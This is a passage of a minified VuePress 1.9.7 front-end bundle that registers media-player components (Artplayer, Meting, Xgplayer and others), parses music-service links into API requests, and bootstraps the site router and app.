n[t](e.player,e.src)}))}))}}]),n}(),ul=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$refs.sbplayer,r=sl()({},n.on),a=Object(rl.a)(Object(rl.a)({},sl()({url:"",fullscreen:!0,autoSize:!0,setting:!0,playbackRate:!0,whitelist:["*"],moreVideoAttr:{preload:"auto"}},n.src)),{},{container:t}),n.player=new dl(a),e.next=6,n.player.InitPlayer();case 6:n.player.AddOnEvent(r),t.style.height=t.scrollWidth*n.height[0]+n.height[1]+"px";case 8:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}});t(216);function ml(n,e){return(ml=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}function gl(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),Object.defineProperty(n,"prototype",{writable:!1}),e&&ml(n,e)}t(217),t(218);function fl(n){return(fl=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}function hl(n,e){if(e&&("object"===Ai(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n)}function bl(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=fl(n);if(e){var a=fl(this).constructor;t=Reflect.construct(r,arguments,a)}else t=r.apply(this,arguments);return hl(this,t)}}t(238),t(239);var vl=function(n){gl(a,n);var e,t=bl(a);function a(){return cs(this,a),t.call(this)}return ds(a,[{key:"InitMeting",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,t,a,o,i,s,l=this,c=arguments;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return e=c.length>0&&void 0!==c[0]?c[0]:{},t=c.length>1?c[1]:void 0,a=[],o=e.audio||[],i=e.list||[],(e.id||e.auto)&&(i=[{id:e.id,server:e.server,type:e.type,auth:e.auth,auto:e.auto}].concat(i.map((function(n){return{id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto}})))),i&&i.length>0&&i.map((function(n){if(n.id||n.auto){var t=l.ParseMeting({id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto},e.api);t&&a.push(t)}})),s=a.map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return n.next=2,fetch(e);case 2:return n.abrupt("return",n.sent.json());case 3:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()),n.next=10,Promise.all(s).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return r.map((function(n){o=o.concat(n.map((function(n){return{name:(null==n?void 0:n.name)||(null==n?void 0:n.title)||"Audio name",artist:(null==n?void 0:n.artist)||(null==n?void 0:n.author)||"Audio artist",url:null==n?void 0:n.url,cover:(null==n?void 0:n.cover)||(null==n?void 0:n.pic),lrc:(null==n?void 0:n.lrc)||(null==n?void 0:n.lyric)||"",type:(null==n?void 0:n.type)||"auto"}})))})),a={container:t,audio:o,fixed:e.fixed,mini:e.mini,autoplay:e.autoplay,loop:e.loop,order:e.order,preload:e.preload,volume:e.volume,mutex:e.mutex,lrcType:e.lrcType,listFolded:e.listFolded,listMaxHeight:e.listMaxHeight,storageName:e.storageName},l.src=a,n.abrupt("return",l.InitPlayer());case 4:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 10:return n.abrupt("return",n.sent);case 11:case"end":return n.stop()}}),n)}))),function(){return e.apply(this,arguments)})},{key:"ParseMeting",value:function(n,e){return n&&n.auto&&(n=this.ParseLink(n.auto)),n&&n.server&&n.type&&n.id?e.replace(":server",n.server).replace(":type",n.type).replace(":id",n.id).replace(":auth",n.auth).replace(":r",Math.random().toString()):""}},{key:"ParseLink",value:function(n){for(var e=0,t=[["music.163.com.*song.*id=(\\d+)","netease","song"],["music.163.com.*album.*id=(\\d+)","netease","album"],["music.163.com.*artist.*id=(\\d+)","netease","artist"],["music.163.com.*playlist.*id=(\\d+)","netease","playlist"],["music.163.com.*discover/toplist.*id=(\\d+)","netease","playlist"],["y.qq.com.*song/(\\w+).html","tencent","song"],["y.qq.com.*songDetail/(\\w+)","tencent","song"],["y.qq.com.*album/(\\w+).html","tencent","album"],["y.qq.com.*singer/(\\w+).html","tencent","artist"],["y.qq.com.*playsquare/(\\w+).html","tencent","playlist"],["y.qq.com.*playlist/(\\w+).html","tencent","playlist"],["xiami.com.*song/(\\w+)","xiami","song"],["xiami.com.*album/(\\w+)","xiami","album"],["xiami.com.*artist/(\\w+)","xiami","artist"],["xiami.com.*collect/(\\w+)","xiami","playlist"]];e<t.length;e++){var r=t[e],a=new RegExp(r[0]).exec(n);if(a)return{server:r[1],type:r[2],id:a[1]}}return console.error("æ æ³è§£æçé¾æ¥: ".concat(n,"ï¼è¯·æ£æ¥é¾æ¥æ¯å¦ä¹¦åæ­£ç¡®")),{}}}]),a}(cl),yl=Ba.extend({props:{id:{required:!1,type:String,default:""},server:{required:!1,type:String,default:"tencent"},type:{required:!1,type:String,default:"song"},auto:{required:!1,type:String,default:""},fixed:{required:!1,type:Boolean,default:!1},mini:{required:!1,type:Boolean,default:!1},autoplay:{required:!1,type:Boolean,default:!1},theme:{required:!1,type:String,default:"#2980b9"},loop:{required:!1,type:String,default:"all"},order:{required:!1,type:String,default:"list"},preload:{required:!1,type:String,default:"auto"},volume:{required:!1,type:Number,default:.7},mutex:{required:!1,type:Boolean,default:!0},lrcType:{required:!1,type:Number,default:3},listFolded:{required:!1,type:Boolean,default:!1},listMaxHeight:{required:!1,type:String,default:"340px"},storageName:{required:!1,type:String,default:"vuepress-plugin-smplayer"},api:{required:!1,type:String,default:"https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&r=:r"},audio:{required:!1,type:Array},list:{required:!1,type:Array}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{meting:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$props,n.meting=new vl,e.next=4,n.meting.InitMeting(t,n.$refs.sbplayer);case 4:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.meting)||void 0===n||n.DestroyPlayer()}}),kl=function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,a,o,i,s,l=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=24;break}if(null!==(e=this.src)&&void 0!==e&&e.type||"string"!=typeof(null===(a=this.src)||void 0===a?void 0:a.url)||(this.src.url.toLowerCase().endsWith(".m3u8")?this.src.type="hls":this.src.url.toLowerCase().endsWith(".flv")?this.src.type="flv":this.src.url.toLowerCase().endsWith(".mpd")&&(this.src.type="shaka")),s=t.e(0).then(t.t.bind(null,389,7)),null===(o=this.src)||void 0===o||!o.type||"string"!=typeof this.src.type){n.next=20;break}n.t0=this.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?7:"flv"===n.t0?9:"dash"===n.t0?11:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?13:"music"===n.t0?15:17;break;case 7:return i=Promise.all([Promise.all([t.e(0),t.e(107)]).then(t.t.bind(null,484,7)),s]),n.abrupt("break",18);case 9:return i=Promise.all([Promise.all([t.e(0),t.e(106)]).then(t.t.bind(null,485,7)),s]),n.abrupt("break",18);case 11:return i=Promise.all([Promise.all([t.e(0),t.e(105)]).then(t.t.bind(null,486,7)),s]),n.abrupt("break",18);case 13:return i=Promise.all([Promise.all([t.e(0),t.e(109)]).then(t.t.bind(null,487,7)),s]),n.abrupt("break",18);case 15:return i=Promise.all([Promise.all([t.e(0),t.e(108)]).then(t.t.bind(null,488,7)),s]),n.abrupt("break",18);case 17:i=t.e(0).then(t.t.bind(null,389,7));case 18:n.next=21;break;case 20:i=Promise.all([s]);case 21:return n.next=23,i.then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(r=Object(Ki.a)(e,1),a=r[0].default,null===(t=l.src)||void 0===t||!t.customInit){n.next=7;break}return n.next=4,l.src.customInit(a,l.src).then((function(n){return n}));case 4:n.t0=n.sent,n.next=8;break;case 7:n.t0=new a(l.src);case 8:return l.player=n.t0,n.abrupt("return",l.player);case 10:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 23:return n.abrupt("return",n.sent);case 24:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),xl=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{url:"",fluid:!0,fitVideoSize:"auto"},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({url:"",fluid:!0,fitVideoSize:"auto"},n.src)),{},{el:n.$refs.sbplayer}),n.player=new kl(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),wl=[function(n){var e=n.Vue,t=(n.options,n.router,n.siteData);t.pages.map((function(n){var e=n.frontmatter,r=e.date,a=e.author;"string"==typeof r&&"Z"===r.charAt(r.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return"".concat(n.getUTCFullYear(),"-").concat(nl(n.getUTCMonth()+1),"-").concat(nl(n.getUTCDate())," ").concat(nl(n.getUTCHours()),":").concat(nl(n.getUTCMinutes()),":").concat(nl(n.getUTCSeconds()))}(r)),a?n.author=a:t.themeConfig.author&&(n.author=t.themeConfig.author)})),e.mixin(Zs)},{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},function(n){var e=n.Vue;e.component("Bilibili",el),e.component("Xigua",tl),e.component("DPlayer",ll),e.component("APlayer",pl),e.component("Artplayer",ul),e.component("Meting",yl),e.component("metingJs",yl),e.component("Xgplayer",xl)}],Sl=[];t(148);var jl=function(n){gl(t,n);var e=bl(t);function t(){return cs(this,t),e.apply(this,arguments)}return ds(t)}(function(){function n(){cs(this,n),this.store=new Ba({data:{state:{}}})}return ds(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){Ba.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(jl.prototype,{getPageAsyncComponent:$i,getLayoutAsyncComponent:Ui,getAsyncComponent:Gi,getVueComponent:Ji});var El={install:function(n){var e=new jl;n.$vuepress=e,n.prototype.$vuepress=e}};function Al(n){n.beforeEach((function(e,t,r){if(Tl(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var a=e.path.replace(/\/$/,"")+".html";Tl(n,a)?r(a):r()}else r();else{var o=e.path+"/",i=e.path+".html";Tl(n,i)?r(i):Tl(n,o)?r(o):r()}}))}function Tl(n,e){var t=e.toLowerCase();return n.options.routes.some((function(n){return n.path.toLowerCase()===t}))}var _l={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return Hi("pageKey",e),Ba.component(e)||Ba.component(e,$i(e)),Ba.component(e)?n(e):n("")}},Il={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},Cl={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Pl=(t(386),t(387),Object(Vs.a)(Cl,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function Rl(){return(Rl=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a,o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Ws.routerBase||Ws.base,Al(r=new ji({base:t,mode:"history",fallback:!1,routes:Ks,scrollBehavior:function(n,e,t){return t||(n.hash?!Ba.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),a={},n.prev=4,n.next=7,Promise.all(wl.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:Ba,options:a,router:r,siteData:Ws,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return o=new Ba(Object.assign(a,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Sl.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:o,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}Ba.config.productionTip=!1,Ba.use(ji),Ba.use(El),Ba.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:Ba;Ei(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),a=new r,o=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),i={};return Object.keys(o).reduce((function(n,e){return e.startsWith("$")&&(n[e]=o[e].get),n}),i),{computed:i}}((function(n){return function(){function e(){cs(this,e)}return ds(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var a in r)"/"===a?e=r[a]:0===this.$page.path.indexOf(a)&&(n=r[a]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Ws)),Ba.component("Content",_l),Ba.component("ContentSlotsDistributor",Il),Ba.component("OutboundLink",Pl),Ba.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),Ba.component("Layout",Ui("Layout")),Ba.component("NotFound",Ui("NotFound")),Ba.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"270c1ca"},function(n){return Rl.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);